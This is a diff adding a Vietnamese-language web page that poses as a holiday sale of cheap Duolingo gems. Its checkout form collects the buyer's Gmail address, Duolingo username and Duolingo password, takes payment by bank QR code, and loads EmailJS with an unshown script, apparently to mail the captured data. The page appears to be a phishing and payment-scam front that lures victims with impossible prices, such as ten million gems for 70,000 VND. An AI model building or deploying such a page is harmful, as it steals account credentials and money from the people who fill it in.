@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ngọc Cực Rẻ Nhân Ngày 30/4-1/5 💎</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <header>
+        <h1>Ngọc Cực Rẻ Nhân Ngày 30/4-1/5 💎</h1>
+    </header>
+    <main>
+        <div class="product">
+            <h3>100.000 Ngọc</h3>
+            <p>Giá: 30.000 VNĐ</p>
+            <p class="bonus">Tặng thêm: 30.000 Ngọc</p>
+            <button onclick="showForm(100000, 30000)">Mua Ngay</button>
+        </div>
+        <div class="product">
+            <h3>200.000 Ngọc</h3>
+            <p>Giá: 50.000 VNĐ</p>
+            <p class="bonus">Tặng thêm: 60.000 Ngọc</p>
+            <button onclick="showForm(200000, 50000)">Mua Ngay</button>
+        </div>
+        <div class="product">
+            <h3>10.000.000 Ngọc</h3>
+            <p>Giá: 70.000 VNĐ</p>
+            <p class="bonus">Tặng thêm: 100.000 Ngọc</p>
+            <button onclick="showForm(10000000, 70000)">Mua Ngay</button>
+        </div>
+    </main>
+
+    <div class="form-container" id="checkoutForm">
+        <h3>Thông tin thanh toán</h3>
+        <form id="paymentForm">
+            <input type="hidden" name="gems" id="gems">
+            <input type="hidden" name="price" id="price">
+            <input type="email" name="userEmail" placeholder="Email Gmail của bạn" pattern="[a-z0-9._%+-]+@gmail\.com$" required title="Vui lòng nhập địa chỉ Gmail hợp lệ">
+            <input type="text" name="duolingoUsername" placeholder="Tài khoản Duolingo của bạn" required>
+            <input type="password" name="duolingoPassword" placeholder="Mật khẩu Duolingo của bạn" required>
+            <div class="qr-code">
+                <p>Quét mã QR để thanh toán:</p>
+                <img id="qrCodeImage" src="" alt="Mã QR Ngân Hàng">
+            </div>
+            <button type="submit">Thanh Toán</button>
+        </form>
+    </div>
+
+    <div class="overlay" id="overlay"></div>
+    <div class="popup" id="popup">
+        <h3 id="popupTitle"></h3>
+        <p id="popupMessage"></p>
+        <button onclick="closePopup()">Đóng</button>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script src="scripts.js"></script>
+</body>
+</html>
